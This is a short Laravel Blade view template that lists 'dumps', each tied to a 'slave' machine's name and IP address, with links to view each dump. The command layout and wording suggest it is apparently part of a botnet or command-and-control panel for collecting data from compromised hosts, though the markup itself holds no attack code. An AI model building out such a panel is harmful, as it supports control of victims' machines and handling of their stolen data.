@extends("templates.command")
@section("content")
    <div class="row">
        <div class="col-md-12">
            <h2>Dumps</h2>
            @if($dumps->count() == 0)
                <div class="empty">No dumps have been collected yet</div>
            @else
            <table class="table table-bordered">
                <thead>
                    <tr>
                        <th>#</th>
                        <th>Slave</th>
                        <th>Submission date</th>
                        <th class="text-right">Options</th>
                    </tr>
                </thead>
                <tbody>
                    @foreach( $dumps as $dump )
                        <tr>
                            <td>{{ $dump->id }}</td>
                            <td>{{ $dump->slave->name." (".$dump->slave->ip.")" }}</td>
                            <td>{{ $dump->created_at }}</td>
                            <td class="text-right"><a href="{{ route('command.dump', $dump->id) }}">View dump</a></td>
                        </tr>
                    @endforeach
                </tbody>
            </table>
            @endif
        </div>
    </div>
@stop
